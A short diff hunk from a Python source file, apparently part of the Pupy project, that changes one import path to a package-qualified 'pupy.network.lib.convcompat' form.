@@ -8,7 +8,7 @@ import getpass
 
 from io import open
 
-from network.lib.convcompat import fs_as_unicode_string
+from pupy.network.lib.convcompat import fs_as_unicode_string
 
 
 if os.name == 'nt':
